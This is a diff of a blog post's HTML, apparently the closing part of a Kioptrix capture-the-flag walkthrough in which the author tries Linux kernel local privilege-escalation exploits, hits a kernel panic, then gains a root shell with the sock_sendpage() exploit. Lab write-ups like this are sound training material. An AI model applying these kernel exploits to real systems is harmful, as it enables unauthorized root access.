 Linux Kernel 2.4.x / 2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Privilege Escalation                                      | ./linux/local/9545.c
@@ -831,10 +1358,10 @@ sh-3.00$ /tmp/9542
 
 </code></pre>
 <p>Well, that's not good... The shell seems to be hung.  Let's check the VMware console:</p>
-<p><img src="https://blog.rootshellz.com/content/images/2017/08/Kernel-Panic-9479.png" alt="Kernel-Panic-9479"></p>
+<p></p>
 <p>Kernel Panic!  Oops, another exploit that seems like it should have worked, but failed.  Again, good material for a future exploit research post, but for now let's reset the VM and try again.</p>
 <h4 id="privilegeescalationtake3">Privilege Escalation - Take 3</h4>
-<p>We are oh-for-two on this local privilege escalation, but the good news is we still have another exploit to try from our original search:<br>
+<p>We are oh-for-two on this local privilege escalation, but the good news is we still have another exploit to try from our original search:<br />
 <code>Linux Kernel 2.4.x / 2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Privilege Escalation                                      | ./linux/local/9545.c</code></p>
 <p>By now, the workflow is clear:</p>
 <p>Download it to our target:</p>
@@ -864,63 +1391,32 @@ uid=0(root) gid=0(root) groups=48(apache)
 <p>Whoomp, there it is!  A root shell!  Since this was the goal of the challenge we can stop here.  There may be other ways in to this box, but we'll leave those shells for a rainy day.</p>
 <h1 id="conclusion">Conclusion</h1>
 <p>Things were looking a bit hairy there for a minute, with two failed exploits back to back.  If we've learned anything here it's persistence — or maybe the lesson is, we shouldn't be running exploits without fist completely digesting them, lest we be confused for a skid.  As mentioned above, it will make for an interesting future exercise to dissect the attempted exploits and understand why they failed.  For now, let's just be content with the root shell we achieved and move forward in our Kioprtix jorney.  See you next time neighbors, until then keep your boxes patched and your shells root.</p>
-<!--kg-card-end: markdown-->
-        </section>
-        
-        <div id="disqus_thread"></div>
-        <script type="text/javascript">
-            var disqus_shortname = d_id; 
-        
-            /* * * DON'T EDIT BELOW THIS LINE * * */
-            (function() {
-                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-            })();
-        </script>
-        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        
-
-        <footer class="post-footer">
 
 
-            <section class="share">
-                <h4>Share this</h4>
-                <a class="icon-twitter" href="http://twitter.com/share?text=Kioptrix: Level 1.1 (#2) Walkthrough&url=https://blog.rootshellz.com/kioptrix-walkthrough-2/"
-                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-                    <span class="hidden">Twitter</span>
-                </a>
-                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.rootshellz.com/kioptrix-walkthrough-2/"
-                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-                    <span class="hidden">Facebook</span>
-                </a>
-                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://blog.rootshellz.com/kioptrix-walkthrough-2/"
-                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-                    <span class="hidden">Google+</span>
-                </a>
             </section>
 
-        </footer>
-
-
-    </article>
-
-</main>
-
-
-    <footer class="site-footer">
-        <!-- <a class="subscribe icon-feed" href="https://blog.rootshellz.com/rss/"><span class="tooltip">Subscribe!</span></a> -->
-        <div class="inner">
-             <section class="copyright">All content copyright <a href="/">rootshellz</a> &copy; 2020 &bull; All rights reserved.</section>
-             <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://ghost.org"><span class="icon-ghost-text">Ghost</span></a> in <a href="https://github.com/mityalebedev/The-Shell">The Shell</a> theme.</section>
-        </div>
+        </article>
+    </main>
+    <footer class="page-footer">
+            <amp-img class="site-icon" src="https://blog.rootshellz.com/content/images/2020/11/Blog-Logo.png" width="50" height="50" layout="fixed"></amp-img>
+        <h3>rootshellz</h3>
+            <p>Drink all the booze hack all the things...</p>
+        <p><a href="https://blog.rootshellz.com">Read more posts →</a></p>
+        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
     </footer>
-
-    <!-- https://cdnjs.com/libraries/prism -->
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.22.0/prism.min.js"></script>
-
-    <script type='text/javascript' src="/assets/highlighter/prettify.js?v=8d33012fb0"></script>
-    <script type='text/javascript' src="/assets/js/shell.js?v=8d33012fb0"></script>
+    
+            <amp-analytics type="gtag" data-credentials="include">
+                <script type="application/json">
+                    {
+                        "vars" : {
+                            "gtag_id": "G-TM0JKQZ7H1",
+                            "config" : {
+                                "G-TM0JKQZ7H1": { "groups": "default" }
+                            }
+                        }
+                    }
+                </script>
+            </amp-analytics>
+        
 </body>
 </html>
